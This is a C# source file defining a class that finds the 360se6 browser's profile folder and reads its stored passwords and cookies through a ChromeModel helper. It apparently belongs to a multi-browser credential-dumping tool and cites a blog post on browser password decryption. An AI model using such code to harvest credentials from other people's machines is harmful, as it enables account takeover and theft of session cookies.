using System;
using System.Text;
using System.IO;
using System.Security.Cryptography;
using System.Collections.Generic;

namespace dao
{
    /// <summary>
    /// http://raidersec.blogspot.com/2013/06/how-browsers-store-your-passwords-and.html#chrome_decryption
    /// </summary>
    class Chrome360se6 : IReader
    {
        public string BrowserName { get { return "360se6"; } }

        private readonly ChromeModel Model;

        public Chrome360se6()
        {
            string LOCAL_PATH = ChromeModel.GetAppDataRoamingPath();
            string userDataPath = Path.Combine(LOCAL_PATH, @"360se6\User Data");
            Model = new ChromeModel(userDataPath);
        }

        public IEnumerable<PassModel> Passwords()
        {
            return Model.ReadPassword();
        }

        public IEnumerable<Cookie> Cookies(string host = null)
        {
            return Model.ReadCookie(host);
        }

    }



}
